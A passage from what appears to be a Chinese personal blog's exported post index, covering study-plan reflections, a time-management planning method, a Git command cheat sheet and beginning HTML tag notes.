<li>作业不知道怎么完成</li>
<li>直接看书会比看视频效率来的更高</li>
<li>看书看到难的地方的时候, 无法消化</li>
<li>打算还是以退为进吧</li>
<li>开始看宋浩吧, 把宋浩看的差不多了再来看书</li>
<li>MIT 的公开课就不看了, 翻译质量太差了</li>
<li>反正MIT的课程的讲义和概率导论差不都可以平替</li>
</ul>
<h4 id="Linear-Algebra"><a href="#Linear-Algebra" class="headerlink" title="Linear Algebra"></a>Linear Algebra</h4><ul>
<li>到底选择怎样的学习方法</li>
<li>是直接看书 ( 因为已经学过一遍了, 可以直接看书 )</li>
<li>还是重新看一遍视频在看书</li>
</ul>
<hr>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><ul>
<li>什么时候开始</li>
<li></li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><ul>
<li>Java 在面向对象方面和 c++不太一样</li>
<li>还有一些api设计的也和c++不太一样</li>
<li>这就导致学习的时候不太兼容</li>
<li>我目前的想法是每天晚上话2 小时进行学习</li>
<li>我感觉还是要边看边练习, 这样印象更深刻</li>
<li>已经学完</li>
<li>要开始做几个项目</li>
<li>swing 不要在使用了</li>
<li>要选几个没有swing 项目使用</li>
<li>但是没有图形界面库, 不能算一个真正的软件, 感觉还是要配合前端</li>
<li>什么时候要把前端补一下</li>
<li>这个还是要靠自己不能等别人</li>
<li>感觉可以直接放弃css了, 等以后用到的时候再来学</li>
<li>现在主要先学JavaScript</li>
<li>还有后面的框架Vue</li>
</ul>
]]></content>
      <categories>
        <category>个人思考</category>
      </categories>
  </entry>
  <entry>
    <title>LearningPlanNote</title>
    <url>/2023/03/01/%E4%B8%AA%E4%BA%BA%E7%9A%84%E6%80%9D%E8%80%83/LearningPlanNote/</url>
    <content><![CDATA[<h1 id="学习计划制定的技巧"><a href="#学习计划制定的技巧" class="headerlink" title="学习计划制定的技巧"></a>学习计划制定的技巧</h1><h2 id="一、每日计划"><a href="#一、每日计划" class="headerlink" title="一、每日计划"></a>一、每日计划</h2><p><strong>制定时间：</strong></p>
<ol>
<li><strong>常规事件：提前1个月列好。</strong></li>
<li><strong>临时事件：出现或想起则随时记录。</strong></li>
</ol>
<p><strong>制定内容：</strong></p>
<ol>
<li><strong>必须完成的事：紧急且重要的事，以及紧急且要做（非重要）的事情。</strong></li>
<li><strong>尽力完成的事：重要不紧急的事情。</strong></li>
</ol>
<p><strong><a href="https://www.zhihu.com/search?q=%E6%A3%80%E6%9F%A5%E5%8C%BA%E5%9F%9F&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22467530612%22%7D">检查区域</a>：</strong></p>
<ol>
<li><strong>执行情况记录。</strong>（可以把一页纸分成左右两栏，左边制定计划，右边记录执行）</li>
</ol>
<p>每日计划由于使用最为频繁，且最接近执行，所以在上一篇文章《<a href="https://zhuanlan.zhihu.com/p/467247863">(三) 如何做一个简单且有效的每日计划</a>》特地介绍一部分关于执行方面的注意事项。</p>
<p>在这篇文章中，更多的是介绍每日计划的内容有哪些，以及什么时候列。</p>
<p>一个常规的认知是，每日计划应该是“今天列明天的计划”，但这其实是个盲区。</p>
<p>每日计划中的条目，是一个个可执行的任务，包括了能够提前确定的常规事件，以及无法确定的临时事件。</p>
<p>对于常规事件，应该提前1个月就做好。比如每日更新文章，每日锻炼，每日读书，每日常规的工作等。</p>
<p>对于<a href="https://www.zhihu.com/search?q=%E4%B8%B4%E6%97%B6%E4%BA%8B%E4%BB%B6&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22467530612%22%7D">临时事件</a>，应该是接收到这个事件，且考虑清楚决定要做之后，判断能否安排到以后再做。如果可以，就添加到进每日计划（可以是今天，也可以是之后）。如果不可以，就打断当前工作，现在就做。</p>
<p><strong>事件列好之后，需要列一个优先级序号，标明哪些任务先做，哪些任务后做。</strong></p>
<p>优先把临时事件延后，看上去是拖延症，但能够更好的保持当前任务的延续性。当然，前提是要能够相对准确的预估任务所需时间，这个能力是可以通过训练培养出来的。（比如，下载一个计时器app，对每天的行为所花时间进行记录。虽然麻烦，但有两个好处：1，提高对时间的敏感度，能够训练预估事件时长的能力，2，能够进一步的控制时长，比如，通过刻意练习，提高起床速度等等）</p>
<p>制定的内容方面，两类就够了。分类太细，对刚开始练习时间管理的人并不友好。当然，如果以后已经养成了时间管理的习惯，可以考虑细化。</p>
<p><a href="https://www.zhihu.com/search?q=%E6%89%A7%E8%A1%8C%E6%83%85%E5%86%B5%E8%AE%B0%E5%BD%95&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22467530612%22%7D">执行情况记录</a>是必须做的。可以用不同颜色的笔，设计一套标记方法。用什么符号表示完成，用什么符号表示做不完<a href="https://www.zhihu.com/search?q=%E6%8E%A8%E5%BB%B6&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22467530612%22%7D">推延</a>到明天或之后的计划里，用什么颜色的笔写备注之类的。每次完成任务的时候，都要进行标注，不要等到一天结束后再集体记录。而再一天结束后，再花5-10分钟去粗略的整理下今天的完成情况和明天的计划情况。</p>
<h2 id="二、每周计划（推荐1-3个动作）"><a href="#二、每周计划（推荐1-3个动作）" class="headerlink" title="二、每周计划（推荐1-3个动作）"></a>二、每周计划（推荐1-3个动作）</h2><p><strong>制定时间：</strong></p>
<ol>
<li><strong>分解动作：提前1个月从月计划的目标里<a href="https://www.zhihu.com/search?q=%E5%88%86%E8%A7%A3&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22467530612%22%7D">分解</a>出来。</strong></li>
<li><strong>临时动作：出现或想起则随时记录。</strong></li>
</ol>
<p><strong>制定内容：</strong></p>
<ol>
<li><strong>必须完成的事：从每月目标中分解出来的动作以及临时出现或想到的事。</strong></li>
<li><strong>尽力完成的事：从每月目标中分解出来的动作以及临时出现或想到的事。</strong></li>
</ol>
<p><strong>检查区域：</strong></p>
<ol>
<li><strong>每周<a href="https://www.zhihu.com/search?q=%E5%A4%8D%E7%9B%98&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22467530612%22%7D">复盘</a>。</strong>（可分为左右两页，左页制定，右页复盘）</li>
</ol>
<p>每周计划和每日计划整体上是相似的，但细节上有些差别。</p>
<p>制定时间是类似的。从月计划中分解出来的动作，属于确定性较强的类型，所以可以提前做计划。需要注意，分解出来的如果是更细的、可以直接执行的任务，就没必要放在周计划里了，直接放在每日计划上就行。同样，如果年计划里可以分解出来具体的动作或者可执行任务，也应该放到周计划和日计划里，而不是放到月计划中。</p>
<p><strong>（按照是否具体： 每年指标&lt;每月目标&lt;每周动作&lt;每日任务）</strong></p>
<p><strong>一般周计划只要列出3个左右的动作就够了，多的话也不容易执行。关于如何把握周计划的具体程度，多试几次就行，前面可能列的要么太具体要么太抽象，但经过刻意训练能够慢慢掌握。</strong></p>
<p>跟每日任务的执行情况记录有所不同，每周复盘主要是对一周得失、执行情况等的总结。</p>
<h2 id="三、每月计划（推荐1个目标）"><a href="#三、每月计划（推荐1个目标）" class="headerlink" title="三、每月计划（推荐1个目标）"></a>三、每月计划（推荐1个目标）</h2><p><strong>制定时间：</strong></p>
<ol>
<li><strong>分解目标：提前1个月从年计划里分解出来。</strong></li>
<li><strong>临时目标：出现或想起则随时记录。</strong></li>
<li><strong>关键事项：出现或想起则随时记录。</strong></li>
</ol>
<p><strong>制定内容：</strong></p>
<ol>
<li><strong>关键目标：从年计划中分解出来的目标以及临时出现或想到的目标。（尽量保持只有1个）</strong></li>
<li><strong>关键事项：重要的事项，可以很快完成，但无法确定具体时间。如果时间确定，则直接放到每日计划中。（可列出多个）</strong></li>
</ol>
<p><strong>检查区域：</strong></p>
<ol>
<li><strong>每月复盘。</strong>（可分为左右两页，左页制定，右页复盘）</li>
</ol>
<p>每月计划跟每周计划也很相似。</p>
<p>制定的时间，除了从年计划里分解出确定性较强的目标是提前1个月制定，其他的临时想到或出现的目标、以及临时出现的关键事项，都是随时记录的。只要不是现在就做的，都可以记录。</p>
<p>除了填充内容的是更抽象（模糊）的“目标”之外，填充内容还多了一个“关键事项”。“关键事项”和每日计划的任务基本是一样的，唯一的差别是时间不确定。</p>
<p><strong>每月的目标，尽量保持当月只有1个核心目标，这样子可以更专注。</strong>其他的比如从年计划的变化指标中分解出来的每日锻炼之类的，就可以直接放进每日计划里，而不是放到月目标中。</p>
<h2 id="四、每年计划（多维度）"><a href="#四、每年计划（多维度）" class="headerlink" title="四、每年计划（多维度）"></a>四、每年计划（多维度）</h2><p><strong>制定时间：</strong></p>
<ol>
<li><strong>时刻思考，时刻修改。明年的目标，今年一整年都可以列。</strong></li>
</ol>
<p><strong>制定内容：</strong></p>
<ol>
<li><strong>基本指标：</strong>人的发展是连续性的，而基本指标主要是为了稳住基本盘。</li>
<li><strong>突破指标：</strong>为了保证进步，在去年的基础上添加的突破性指标，在基本指标的基础上建立。（也可以直接合并到基本指标中）</li>
<li><strong>变化指标：</strong>刻意引入变化，比如换公司，换城市，换工作，换生活习惯等。</li>
</ol>
<p><strong>检查区域：</strong></p>
<ol>
<li><strong>每年复盘。</strong>（可分为左右两页，左页制定，右页复盘）</li>
</ol>
<p>年计划太重要了。所以不应该等到年底或者春节的时候再做，而是应该今年一整年都在思考。</p>
<p>随着认知、思维、时局的不同，年计划也是可以随着改变的。不断的修改，不断的完善。甚至，在当年的5-6月份依旧可以修改年计划。</p>
<p>需要主要几个节点：</p>
<p>五一：五一是承上启下的时间点，需要在该节点复盘上半年的计划执行情况。</p>
<p>十一：十一是一年的尾声，需要准备冲击今年的突破指标；同时，从这个节点开始，要尽可能的完善明年的计划（之前是随时思考，十一之后就需要刻意思考明年计划了）。</p>
<p>春节：总结这一年的计划执行情况，完善明年的计划，准备启动。</p>
<p>制定的内容，需要是多维度的。这里使用的是，基本指标，突破指标，和变化指标三个维度。也可以使用情感、家庭、经济、能力等维度。</p>
<p><a href="https://www.zhihu.com/search?q=%E5%B9%B4%E5%BA%A6%E8%AE%A1%E5%88%92&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22467530612%22%7D">年度计划</a>是最关键的，是全局大方向，需要不断的完善，时时的完善。刚开始的目标，可以比较模糊。但需要花一年的时间，去不断的迭代。</p>
<h2 id="自己的思考"><a href="#自己的思考" class="headerlink" title="自己的思考"></a>自己的思考</h2><h4 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h4><ul>
<li><p>每日计划就不需要复盘了</p>
</li>
<li><p>如何复盘</p>
<ul>
<li>笔记中应该如何排版</li>
<li></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>个人思考</category>
      </categories>
  </entry>
  <entry>
    <title>Git语法</title>
    <url>/2023/03/01/%E7%BC%96%E7%A8%8B%E6%8A%80%E8%83%BD/Git%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h1 id="Git语法"><a href="#Git语法" class="headerlink" title="Git语法"></a>Git语法</h1><h2 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h2><p><a href="https://www.bilibili.com/video/BV1vy4y1s7k6?p=1">B站教程</a></p>
<p>[Toc]</p>
<h2 id="基础的语法"><a href="#基础的语法" class="headerlink" title="基础的语法"></a>基础的语法</h2><h3 id="本地库"><a href="#本地库" class="headerlink" title="本地库"></a>本地库</h3><h4 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h4><ul>
<li>git config user.name	查看用户名</li>
<li>git config user.email	查看邮箱地址</li>
<li>git config –global user.name “username”	修改用户名</li>
<li>git config –global user.email “email”	修改邮箱地址</li>
<li>git config -l    查看Git全局设置信息</li>
</ul>
<h4 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h4><ul>
<li>git init	把当前目录变成Git可以管理的仓库，会在当前目录下生成.git目录如果.git目录是藏隐的，可用 ls -ah 命令显示</li>
</ul>
<h4 id="查看仓库状态"><a href="#查看仓库状态" class="headerlink" title="查看仓库状态"></a>查看仓库状态</h4><ul>
<li>git status	查看当前仓库的状态</li>
<li>git diff	工作区(workdict)和暂存区(stage)的比较</li>
<li>git diff commit_id	工作区(workdict)和指定版本的比较</li>
<li>git diff commit_id – file	工作区(workdict)和指定版本中的指定文件的比较</li>
<li>git diff –cached	暂存区(stage)和分支(master)的比较</li>
</ul>
<h4 id="添加文件"><a href="#添加文件" class="headerlink" title="添加文件"></a>添加文件</h4><ul>
<li>git add file	把文件添加到仓库(暂存区</li>
<li>git commit -m “comments”	把文件提交到仓库(分支)，-m后面是备注注释</li>
<li>git add .	添加目录下的所有文件</li>
<li>git add folder&#x2F;	添加目录下的指定文件夹</li>
</ul>
<h4 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h4><ul>
<li>git log	查看提交历</li>
<li>git log -pretty&#x3D;oneline	查看提交历史，并使内容单行显示</li>
<li>git reflog	查看命令历史</li>
</ul>
<h4 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h4><ul>
<li>rm file	删除工作区文件，不提交到暂存区</li>
<li>git rm file	删除工作区文件，自动提交到暂存区</li>
</ul>
<h4 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h4><ul>
<li>git reset –hard commit_id	回退到指定版本，版本号没必要写全，前几位就可以了</li>
<li>git reset commit_id file	指定文件回退到指定版本</li>
<li>git reset	用来撤销所有暂存区域文件</li>
<li>git reset – file	用来撤销最后一次git add file</li>
</ul>
<h3 id="远程库"><a href="#远程库" class="headerlink" title="远程库"></a>远程库</h3><h4 id="关联远程库"><a href="#关联远程库" class="headerlink" title="关联远程库"></a>关联远程库</h4><ul>
<li>git remote add origin xxx	关联远程库，远程库的名字就是origin这是Git默认的叫法，也可以改成别的</li>
<li>从远程仓库克隆</li>
<li>git clone xxx	Git支持多种协议默认的git:&#x2F;&#x2F;使用ssh，也可以使用https等其他协议</li>
<li>git remote rm origin     删除名字为“origin“关联远程库</li>
<li>git remote    查看当前的远程仓库</li>
<li>git remote show &lt;远程仓库&gt;    查看某个远程仓库的详细信息</li>
</ul>
<h4 id="推送"><a href="#推送" class="headerlink" title="推送"></a>推送</h4><ul>
<li>git push origin master	将本地库推送至远程库</li>
</ul>
<h4 id="抓取"><a href="#抓取" class="headerlink" title="抓取"></a>抓取</h4><ul>
<li>git pull	抓取</li>
</ul>
<h5 id="拉取常见的问题"><a href="#拉取常见的问题" class="headerlink" title="拉取常见的问题"></a>拉取常见的问题</h5><ul>
<li>拉起出现fatal，可能是因为远程库和本地的内容存在出入，需要将本地的内容提交（commit）以后在开始pull</li>
</ul>
<h4 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h4><ul>
<li>git branch dev	创建分支dev</li>
<li>git branch -d dev	删除分支dev</li>
<li>git checkout dev	切换到分支dev</li>
<li>git checkout -b dev	加上-b参数表示创建并切换dev分支</li>
<li>git branch	查看当前分支，会列出所有分支，当前分支前面会标示*号</li>
<li>git merge dev	合并指定分支到当前分支</li>
</ul>
<h4 id="分支策略"><a href="#分支策略" class="headerlink" title="分支策略"></a>分支策略</h4><ul>
<li>在实际开发中，我们应该按照几个基本原则进行分支管理</li>
<li>master分支应该是非常稳定的，仅用来发布新版本，平时不能在上面干活</li>
<li>干活都在dev分支上，dev分支是不稳定的，到某个时候，比如1.0版本发布时，再把dev分支合并到master上，在master分支发布1.0版本</li>
<li>每个人都在dev分支上干活，每个人都有自己的分支，时不时地往dev分支上合并<br><img src="https://img-blog.csdnimg.cn/20201216171821903.png#pic_center#id=gMnNX&originHeight=125&originWidth=498&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
</ul>
<h4 id="Bug分支"><a href="#Bug分支" class="headerlink" title="Bug分支"></a>Bug分支</h4><h5 id="为什么要用到Bug分支"><a href="#为什么要用到Bug分支" class="headerlink" title="为什么要用到Bug分支"></a>为什么要用到Bug分支</h5><p>当线上(master)出现Bug需要修复，而手上的工作(dev)只进行了一半不想提交,可以将此时的工作区储藏起来；跳转到master分支,通过一个新的临时分支来修复，修复后合并分支，然后将临时分支删除。然后在跳转到dev分支，将之前储藏的工作区恢复，继续工作</p>
<h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><ul>
<li>git stash	把当前工作现场”储藏”起来，等以后恢复现场后继续工作</li>
<li>git stash list    	查看”储藏”的工作现场</li>
<li>git stash apply       恢复但stash内容并不删除，要用git stash drop来删除</li>
<li>git stash drop     删除stash内容</li>
<li>git stash pop     恢复的同时把stash内容也删了</li>
</ul>
<h4 id="Feature分支"><a href="#Feature分支" class="headerlink" title="Feature分支"></a>Feature分支</h4><h5 id="为什么要用到Feature分支"><a href="#为什么要用到Feature分支" class="headerlink" title="为什么要用到Feature分支"></a>为什么要用到Feature分支</h5><ul>
<li>软件开发中，总有无穷无尽的新功能要不断添加进来。</li>
<li>在添加一个新功能的时候，你肯定不希望因为一些实验性质的代码，把主分支搞乱了，所以，每添加一个新功能，最好新建一个feature分支，在上面开发，完成后，合并，最后，删除该feature分支。</li>
</ul>
<h5 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h5><ul>
<li>git branch -D feature-vulcan	强行删除没有合并的分支</li>
<li>开发一个新feature，最好新建一个分支；</li>
<li>如果要丢弃一个没有被合并过的分支，可以通过git branch -D 强行删除。</li>
</ul>
<h4 id="标签管理"><a href="#标签管理" class="headerlink" title="标签管理"></a>标签管理</h4><ul>
<li>git tag v1.0	创建标签，默认标签是打在最新提交的commit上的即HEAD</li>
<li>git tag v1.0 commit_id	给指定的commit_id创建标签</li>
<li>git tag -a v1.0 -m “Comments” commit_id	创建带有说明的标签</li>
<li>git tag	查询所有标签，按字母排序</li>
<li>git tag show v1.0	查看标签信息</li>
<li>git tag -d v1.0	删除标签</li>
<li>git push origin v1.0	推送某个标签到远程</li>
<li>git push origin –tags	推送全部尚未推送到远程的本地标签</li>
<li>git tag -d v1.0	本地删除</li>
<li>git push origin :refs&#x2F;tags&#x2F;v1.0	本地删除</li>
<li>如果标签已经推送到远程，需要先从本地删除，再从远程删除</li>
</ul>
<h4 id="多人协作"><a href="#多人协作" class="headerlink" title="多人协作"></a>多人协作</h4><ul>
<li>git remote	查看远程库的信息</li>
<li>git remote -v	显示远程库更详细的信息</li>
<li>git remote rm origin	删除关联的origin远程库</li>
<li>git fetch origin	查看远程库的信息</li>
<li>git diff branch origin&#x2F;branch	查看远程库分支与本地分支的对比</li>
<li>git diff branchA branchB	查看本地分支的对比</li>
</ul>
<h4 id="推送分支"><a href="#推送分支" class="headerlink" title="推送分支"></a>推送分支</h4><ul>
<li>git push origin master	把本地分支上的所有本地提交推送到远程库对应的远程分支上</li>
<li>git push origin master -f	表示舍弃线上的文件，强制推送</li>
<li>master分支是主分支，因此要时刻与远程同步</li>
<li>dev分支是开发分支，团队所有成员都需要在上面工作，所以也需要与远程同步</li>
<li>bug分支只用于在本地修复bug，就没必要推到远程了</li>
<li>feature分支是否推到远程，取决于你是否和你的小伙伴合作在上面开发</li>
<li>抓取分支</li>
<li>git pull	抓取分支</li>
<li>git branch –set-upstream dev origin&#x2F;dev	抓取必须指定本地分支与远程分支的链接</li>
<li>git checkout -b dev origin&#x2F;dev	创建远程origin的dev分支到本地</li>
<li></li>
</ul>
<h4 id="多人协作的工作模式通常是这样"><a href="#多人协作的工作模式通常是这样" class="headerlink" title="多人协作的工作模式通常是这样"></a>多人协作的工作模式通常是这样</h4><ul>
<li>首先，可以试图用git push origin branch-name推送自己的修改</li>
<li>如果推送失败，则因为远程分支比你的本地更新，需要先用git pull试图合并</li>
<li>如果合并有冲突，则解决冲突，并在本地提交</li>
<li>没有冲突或者解决掉冲突后，再用git push origin branch-name推送就能成功</li>
<li>如果git pull提示“no tracking information”，则说明本地分支和远程分支的链接关系没有创建，用命令git branch –set-upstream branch-name origin&#x2F;branch-name。</li>
</ul>
<h4 id="自定义Git"><a href="#自定义Git" class="headerlink" title="自定义Git"></a>自定义Git</h4><ul>
<li>git config –global color.ui true	让Git显示颜色，会让命令输出看起来更醒目</li>
</ul>
<h4 id="忽略特殊文件"><a href="#忽略特殊文件" class="headerlink" title="忽略特殊文件"></a>忽略特殊文件</h4><ul>
<li>touch .gitignore	创建.gitignore文件</li>
<li>git add -f file	用-f可以强制添加</li>
<li>git check-ignore -v file	显示忽略规则的位置</li>
</ul>
<blockquote>
<p>忽略文件的原则是：</p>
<p>忽略操作系统自动生成的文件，比如缩略图等<br>忽略编译生成的中间文件、可执行文件等，比如Java编译产生的.class文件<br>忽略你自己的带有敏感信息的配置文件，比如存放口令的配置文件</p>
</blockquote>
<h4 id="忽略特殊文件的书写"><a href="#忽略特殊文件的书写" class="headerlink" title="忽略特殊文件的书写"></a>忽略特殊文件的书写</h4><h5 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h5><ul>
<li>注释使用 # 开头，后面跟注释内容</li>
</ul>
<h5 id="忽略文件和目录"><a href="#忽略文件和目录" class="headerlink" title="忽略文件和目录"></a>忽略文件和目录</h5><ul>
<li>folderName : 表示忽略 folderName 文件和 folderName 目录，会自动搜索多级目录</li>
</ul>
<h5 id="仅忽略文件"><a href="#仅忽略文件" class="headerlink" title="仅忽略文件"></a>仅忽略文件</h5><ul>
<li>仅忽略 folderName 文件，而不忽略 folderName 目录，其中，感叹号“!”表示反向操作。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">folderName</span><br><span class="line">!folderName/</span><br></pre></td></tr></table></figure>

<h5 id="忽略目录"><a href="#忽略目录" class="headerlink" title="忽略目录"></a>忽略目录</h5><p>模式如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">folderName/</span><br></pre></td></tr></table></figure>

<p>忽略 folderName 目录，包括：</p>
<ul>
<li>当前目录下的foldernName，例如：folderName&#x2F;；</li>
<li>多级目录下的 folderName，例如：*&#x2F;*&#x2F;folderName&#x2F;；</li>
</ul>
<h5 id="使用通配符"><a href="#使用通配符" class="headerlink" title="使用通配符"></a>使用通配符</h5><ul>
<li>星号“*” ：匹配多个字符；</li>
<li>问号“?”：匹配除 ‘&#x2F;’外的任意一个字符；</li>
<li>方括号“[xxxx]”：匹配多个列表中的字符；</li>
</ul>
<p>来看一个简单的例子，本地仓库的目录结构如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linuxy@linuxy:~/linuxGit$ tree</span><br><span class="line">.</span><br><span class="line">├── src</span><br><span class="line">│   ├── add.c</span><br><span class="line">│   ├── add.i</span><br><span class="line">│   └── add.o</span><br><span class="line">├── test.c</span><br><span class="line">├── test.i</span><br><span class="line">└── test.o</span><br><span class="line"> </span><br><span class="line">1 directory, 6 files</span><br><span class="line">linuxy@linuxy:~/linuxGit$</span><br></pre></td></tr></table></figure>

<p>其中，.gitignore 文件内容如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linuxy@linuxy:~/linuxGit$ cat .gitignore </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*.[io]</span><br><span class="line">linuxy@linuxy:~/linuxGit$</span><br></pre></td></tr></table></figure>

<p>故在本地仓库中，test.i文件、test.o文件、src&#x2F;add.o文件、src&#x2F;add.i文件会被忽略，而 test.c文件和add.c 文件不会被忽略。注意：这里忽略的匹配模式是多级目录的。</p>
<h5 id="忽略已经纳入版本管理的文件"><a href="#忽略已经纳入版本管理的文件" class="headerlink" title="忽略已经纳入版本管理的文件"></a>忽略已经纳入版本管理的文件</h5><ul>
<li>有时候在项目开发过程中，突然心血来潮想把某些目录或文件加入忽略规则，按照上述方法定义后发现并未生效，原因是.gitignore只能忽略那些原来没有被track的文件，如果某些文件已经被纳入了版本管理中，则修改.gitignore是无效的。那么解决方法就是先把本地缓存删除（改变成未track状态），然后再提交： </li>
<li>代码实现</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git rm -r --cached .</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;&quot;</span><br></pre></td></tr></table></figure>

<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><h3 id="放弃本次的修改"><a href="#放弃本次的修改" class="headerlink" title="放弃本次的修改"></a>放弃本次的修改</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git reset --hard</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程技能</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>前端</title>
    <url>/2023/03/01/%E7%BC%96%E7%A8%8B%E6%8A%80%E8%83%BD/%E5%89%8D%E7%AB%AF/</url>
    <content><![CDATA[<p>前端笔记</p>
<h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><h4 id="1-HTML的基本标签"><a href="#1-HTML的基本标签" class="headerlink" title="1. HTML的基本标签"></a>1. HTML的基本标签</h4><p>整个网页是从<code>&lt;html&gt;</code>这里开始的，然后到<code>&lt;/html&gt;</code>结束。</p>
<h4 id="head标签"><a href="#head标签" class="headerlink" title="head标签"></a>head标签</h4><table>
<thead>
<tr>
<th align="center"><strong><code>&lt;head&gt;</code>内部标签</strong></th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>&lt;title&gt;</code></td>
<td align="center">定义网页的标题</td>
</tr>
<tr>
<td align="center"><code>&lt;meta&gt;</code></td>
<td align="center">定义网页的基本信息（供搜索引擎）</td>
</tr>
<tr>
<td align="center"><code>&lt;style&gt;</code></td>
<td align="center">定义CSS样式</td>
</tr>
<tr>
<td align="center"><code>&lt;link&gt;</code></td>
<td align="center">链接外部CSS文件或脚本文件</td>
</tr>
<tr>
<td align="center"><code>&lt;script&gt;</code></td>
<td align="center">定义脚本语言</td>
</tr>
</tbody></table>
<h4 id="body标签"><a href="#body标签" class="headerlink" title="body标签"></a>body标签</h4><p>定义网页展示内容，这些内容往往都是“可见内容”（在浏览器可见）</p>
<p>接下来的内容都为 <strong>body标签</strong></p>
<h3 id="2-段落与文字"><a href="#2-段落与文字" class="headerlink" title="2. 段落与文字"></a>2. 段落与文字</h3><h4 id="2-1-段落标签"><a href="#2-1-段落标签" class="headerlink" title="2.1. 段落标签"></a>2.1. 段落标签</h4><table>
<thead>
<tr>
<th align="center">标签</th>
<th align="center">语义</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>&lt;h1&gt;~&lt;h6&gt;</code></td>
<td align="center">header</td>
<td align="center">标题</td>
</tr>
<tr>
<td align="center"><code>&lt;p&gt;</code></td>
<td align="center">paragraph</td>
<td align="center">段落</td>
</tr>
<tr>
<td align="center"><code>&lt;br&gt;</code></td>
<td align="center">break</td>
<td align="center">换行</td>
</tr>
<tr>
<td align="center"><code>&lt;hr&gt;</code></td>
<td align="center">horizontal rule</td>
<td align="center">水平线</td>
</tr>
<tr>
<td align="center"><code>&lt;div&gt;</code></td>
<td align="center">division</td>
<td align="center">分割（块元素）</td>
</tr>
<tr>
<td align="center"><code>&lt;span&gt;</code></td>
<td align="center">span</td>
<td align="center">区域（行内元素）</td>
</tr>
</tbody></table>
<h4 id="2-2-文本格式化标签"><a href="#2-2-文本格式化标签" class="headerlink" title="2.2. 文本格式化标签"></a>2.2. 文本格式化标签</h4><table>
<thead>
<tr>
<th align="center">标签</th>
<th align="center">语义</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>&lt;strong&gt;</code></td>
<td align="center">strong（加强）</td>
<td align="center">加粗</td>
</tr>
<tr>
<td align="center"><code>&lt;em&gt;</code></td>
<td align="center">emphasized（强调）</td>
<td align="center">斜体</td>
</tr>
<tr>
<td align="center"><code>&lt;cite&gt;</code></td>
<td align="center">cite（引用）</td>
<td align="center">斜体</td>
</tr>
<tr>
<td align="center"><code>&lt;sup&gt;</code></td>
<td align="center">superscripted（上标）</td>
<td align="center">上标</td>
</tr>
<tr>
<td align="center"><code>&lt;sub&gt;</code></td>
<td align="center">subscripted（下标）</td>
<td align="center">下标</td>
</tr>
<tr>
<td align="center"><code>&lt;del&gt;</code></td>
<td align="center">delete(删除)</td>
<td align="center">删除线</td>
</tr>
<tr>
<td align="center"><code>&lt;ins&gt;</code></td>
<td align="center"></td>
<td align="center">下划线</td>
</tr>
</tbody></table>
<h4 id="2-3-特殊符号"><a href="#2-3-特殊符号" class="headerlink" title="2.3. 特殊符号"></a>2.3. 特殊符号</h4><p><strong>常用类</strong></p>
<table>
<thead>
<tr>
<th align="center">字符</th>
<th align="center">实体名称</th>
<th align="center">实体数字</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"></td>
<td align="center"><code>&amp;nbsp;</code></td>
<td align="center"><code>&amp;#160;</code></td>
<td align="center">空格</td>
</tr>
<tr>
<td align="center">&amp;</td>
<td align="center"><code>&amp;amp;</code></td>
<td align="center"><code>&amp;#38;</code></td>
<td align="center">and符号，与</td>
</tr>
<tr>
<td align="center">“</td>
<td align="center"><code>&amp;quot;</code></td>
<td align="center"><code>&amp;#34;</code></td>
<td align="center">引号</td>
</tr>
<tr>
<td align="center">…</td>
<td align="center"><code>&amp;hellip;</code></td>
<td align="center"><code>&amp;#8230;</code></td>
<td align="center">省略号</td>
</tr>
<tr>
<td align="center">—</td>
